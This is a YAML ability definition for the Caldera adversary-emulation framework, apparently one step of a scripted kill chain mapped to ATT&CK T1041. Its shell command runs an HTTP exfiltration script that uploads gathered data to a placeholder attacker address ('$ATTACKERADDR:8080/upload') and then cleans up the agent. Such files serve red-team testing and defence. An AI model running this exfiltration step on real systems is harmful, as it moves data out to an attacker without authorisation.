- id: 20000000-0000-0000-0000-000000000212
  name: KC2-212 - Data exfiltration
  description: Package the information accumulated by the KC02 child agent.
  tactic: exfiltration
  technique:
    attack_id: T1041
    name: Exfiltration Over C2 Channel
  repeatable: false
  singleton: true
  platforms:
    linux:
      sh:
        command: |
          CHILD='#{host.kc2.child}';
          PREV='#{kc2.211.done}';
          mkdir -p "$DATA_PATH/KC2/analysis";
          /opt/caldera/KC2/HTTP-exfiltration.py --data-path "$DATA_PATH" --server-url "http://$ATTACKERADDR:8080/upload" > "$DATA_PATH/KC2/analysis/exfiltration.log" 2>&1 && echo kc2-212-done && /opt/caldera/KC2/caldera-agent-cleanup.py --async
        timeout: 900
        parsers:
          plugins.stockpile.app.parsers.basic:
          - source: kc2.212.done
        cleanup: ''
  requirements:
  - plugins.stockpile.app.requirements.paw_provenance:
    - source: host.kc2.child
